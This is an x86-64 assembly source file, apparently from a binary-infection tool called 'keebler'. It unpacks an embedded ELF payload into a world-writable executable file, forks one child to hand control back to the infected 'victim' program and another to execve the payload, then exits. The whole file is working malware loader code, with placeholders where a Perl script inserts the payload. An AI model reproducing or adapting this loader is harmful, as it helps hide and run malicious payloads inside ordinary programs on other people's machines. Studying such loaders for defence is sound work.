################################################################################
# Bootstrap-64.s
#-------------------------------------------------------------------------------
#
# Unpacks a payload executable, spawns two children, one for the victim and one
# for the payload. It then waits for both to exit, an then calls sys_exit with
# return value 0.
#
# Note: The unpacked executable will be stored in the file system. It is the
#       Responsibility of the executable to remove its file.
################################################################################

.text
.globl _start
_start:
  pushq %rbp
  pushq %rbx
  mov %rsp,%rbp
 
################################################################################
# Open our temporary file
################################################################################
#push "./keebler-bootstrap" onto the stack
  xor %rcx, %rcx
  pushq %rcx
  movq $0x0000000000706172, %rcx
  pushq %rcx
  movq $0x7473746f6f622d72, %rcx
  pushq %rcx
  movq $0x656c6265656b2f2e, %rcx
  pushq %rcx
  movq %rsp, %rdi
  pushq %rdi #save the string, we'll need it later
#we want to create it if it doesn't exist
  movq $0x242, %rsi
#we want world read write exec
  movq $0x1FF, %rdx
#we want the open sys call
  movq $2, %rax
  syscall
 
################################################################################
# Write to our file!
################################################################################
#file pointer in rdi
  movq %rax, %rdi #grab the file pointer
  push %rdi
#jump to the elf into then call back to get it's memory location
  jmp _elf_info
_save_info:
  pop %rcx #the location in memory of the size
#grab the size
  xorq %rdx, %rdx
  movl (%rcx), %edx
#point to the elf info
  leaq 0x4(%rcx), %rsi
#we want the write sys call
  movq $0x01, %rax
  syscall
 
################################################################################
# Close our temporary file
################################################################################
#we want the close sys call
  pop %rdi #grab the file pointer
  movq $0x03, %rax
  syscall

################################################################################
# Spawn 2 Children
################################################################################
#push a "struct pt_regs" on to the stack in reverse order
  movq %rsp, %rbx
  pushq $0 #%r18
  pushq $0 #%r17
  pushq $0 #%r16
  pushq $0 #%gp
  pushq $0 #%pc
  pushq $0 #%ps
  pushq $0 #%trap_a2
  pushq $0 #%trap_a1
  pushq $0 #%trap_a0
  pushq $0 #%hae
  pushq $0 #%r28
  pushq $0 #%r27
  pushq $0 #%r26
  pushq $0 #%r25
  pushq $0 #%r24
  pushq $0 #%r23
  pushq $0 #%r22
  pushq $0 #%r21
  pushq $0 #%r20
  pushq $0 #%r19
  pushq %r8
  pushq %rdi
  pushq %rsi
  pushq %rbp
  pushq %rbx #%rsp
  pushq %rbx
  pushq %rdx
  pushq %rcx
  pushq %rax
#save the location of this monstrosity on in rdi
  movq %rsp, %rdi
#we want sys_fork
  movq $57, %rax
  syscall

#if something fucked up, return to cild
  cmp $-1, %rax
  jz _return_to_target
#if we are the child jump to the end
  cmp $0, %rax
  jz _return_to_target

#Spawn another process, this time for the payload
  movq %rsp, %rdi
  push %rax # save the process id of the victim
#we want sys_fork
  movq $57, %rax
  syscall

#if something fucked up, abort
  cmp $-1, %rax
  jz _sys_exit
#if we are the child jump to the end
  cmp $0, %rax
  jz _spawn_payload


################################################################################
# Reap both of our children and gracefully return
################################################################################
  pop %rcx #the process id of the victim
  movq %rbx, %rsp #pop the register struct off the stack
  pop %rdx #remove the exe path from the stack also

  mov $0, %rdi #we want to wait for all children
  mov $0, %rsi #pid doesn't matter
  mov $0, %rdx #hopefully we can pass in null here
  mov $4, %rcx #only wait for terminated children
  mov $247, %rax #waitid syscall
  syscall

  mov $0, %rdi #we want to wait for all children
  mov $0, %rsi #pid doesn't matter
  mov $0, %rdx #hopefully we can pass in null here
  mov $4, %rcx #only wait for terminated children
  mov $247, %rax #waitid syscall
  syscall

  jmp _sys_exit


################################################################################
# Execute the bootstrapped elf
################################################################################
_spawn_payload:
  movq %rbx, %rsp #pop the register struct off the stack
#load the file string
  pop %rdi
#Create an array of string pointers on the stack or ARGV and ENV
  pushq $0 #must be null terminated
  movq %rsp, %rdx #save just the null array for ENV
  pushq %rdi #push the file path
  movq %rsp, %rsi #argv is [filepath,0]
#we want the execve sys call
  movq $59, %rax
  syscall

################################################################################
# Gracefully exit this process
################################################################################
_sys_exit:
  movq $0, %rdi
  movq $0x3c, %rax # exit(3c)
  syscall

################################################################################
# Return control to the victim 
################################################################################
_return_to_target:
  movq %rbx, %rsp #pop the register struct
  pop %rcx
#pop the location of the file path string
  pop %rcx
#pop off all our strings
  pop %rcx
  pop %rcx
  pop %rcx

#return
  pop %rbx
  pop %rbp
  ret

################################################################################
# Where the embeded executable will go
################################################################################
_elf_info:
  call _save_info
#replaced by bootstrap.pl
_elf_size: <_elf_size>
_elf_data: <_elf_data>
